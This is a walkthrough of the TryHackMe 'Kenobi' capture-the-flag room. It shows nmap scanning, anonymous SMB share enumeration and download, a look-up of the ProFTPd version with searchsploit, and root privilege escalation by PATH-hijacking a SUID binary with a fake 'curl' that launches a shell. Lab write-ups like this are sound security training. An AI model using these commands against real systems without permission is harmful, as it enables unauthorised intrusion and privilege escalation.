---
date: '2025-02-01T22:59:59+05:30'
draft: false
title: 'Kenobi: TryHackMe Walkthrough'
slug: kenobi-thm-walkthrough
tags: ["tryhackme", "ctf", "pentesting", "linux"]
category: writeups
showtoc: true
summary: A detailed walkthrough of the Kenobi room on TryHackMe, covering port scanning, SMB enumeration, ProFTPd exploitation, and privilege escalation
description: Complete walkthrough of TryHackMe's Kenobi room demonstrating various penetration testing techniques including port scanning, SMB enumeration, and privilege escalation
---

# Kenobi: TryHackMe Walkthrough

## Port Scan

Initial port scan using nmap revealed several open ports:

```bash
nmap -sV -vv 10.10.196.59
```

Discovered services:
- Port 21: ProFTPD 1.3.5
- Port 22: OpenSSH 7.2p2 Ubuntu
- Port 80: Apache httpd 2.4.18
- Port 111: rpcbind
- Port 139/445: Samba (WORKGROUP)
- Port 2049: nfs_acl

Target identified as KENOBI running Linux.

## Enumerating Samba for shares

Two methods were employed for SMB enumeration:

### 1. Using enum4linux
### 2. Using nmap scripts

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
```

### Key Findings
- Anonymous share discovered with anonymous login permitted
- Retrieved log.txt containing:
  - ProFTPd configuration information
  - SSH creation logs
  - Various usernames
- Full share download accomplished using:

```bash
smbget -R smb://ip/anonymous
```

Additional enumeration of RPC (port 111) revealed a mounted /var folder.

## Gaining access with ProFTPd

The target was running ProFTPD version 1.3.5 as identified in the initial scan.

Initial connection established using netcat:
```bash
nc ip 21
```

Vulnerability research was conducted using searchsploit for the specific ProFTPd version.

## Privilege Escalation

The privilege escalation process involved the following steps:

1. SUID/SGID file enumeration:
```bash
find / -perm -u=s -type f 2>/dev/null
```

2. Exploit creation:
```bash
echo /bin/sh > curl
chmod 777 curl
```

3. Path manipulation and execution:
   - Added current directory to path
   - Executed `/usr/bin/menu` binary to achieve privilege escalation
